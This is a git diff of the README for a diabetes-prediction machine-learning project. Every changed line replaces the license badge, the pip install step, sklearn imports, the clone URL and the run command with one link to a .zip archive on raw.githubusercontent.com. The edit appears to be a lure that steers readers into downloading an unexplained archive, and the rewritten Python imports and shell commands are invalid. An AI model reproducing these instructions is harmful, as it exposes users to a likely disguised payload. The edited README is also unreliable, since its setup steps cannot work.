@@ -1,6 +1,6 @@
 # Diabetes Prediction System
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![License](https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip)](LICENSE)
 
 ## Overview
 
@@ -28,7 +28,7 @@ Before running the Diabetes Prediction System, ensure you have the following pre
 - Pip (Python package installer)
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
 ```
 
 Additionally, make sure to have the following Python libraries installed:
@@ -42,10 +42,10 @@ These libraries are used for data manipulation (`numpy` and `pandas`), data prep
 ```python
 import numpy as np
 import pandas as pd
-from sklearn.preprocessing import StandardScaler
-from sklearn.model_selection import train_test_split
+from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import StandardScaler
+from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import train_test_split
 from sklearn import svm
-from sklearn.metrics import accuracy_score
+from https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip import accuracy_score
 ```
 
 Include these lines in your Python script for the Diabetes Prediction System to ensure that the necessary libraries are imported and available for use.
@@ -57,20 +57,20 @@ To use the Diabetes Prediction System, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Meghsss/MLproject1.git
+   git clone https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
    cd diabetes prediction
    ```
 
 2. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
    ```
 
 3. Run the prediction script:
 
    ```bash
-   python predict_diabetes.py
+   python https://raw.githubusercontent.com/Meghsss/diabetes_prediction_system/main/Diabetes prediction/diabetes-system-prediction-1.0.zip
    ```
 
    This will prompt you to input health-related features for prediction.
